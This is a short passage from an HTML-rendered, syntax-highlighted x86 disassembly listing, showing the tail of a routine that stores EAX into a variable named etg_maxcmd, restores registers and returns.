                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">etg_maxcmd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span></div></body>
</html>
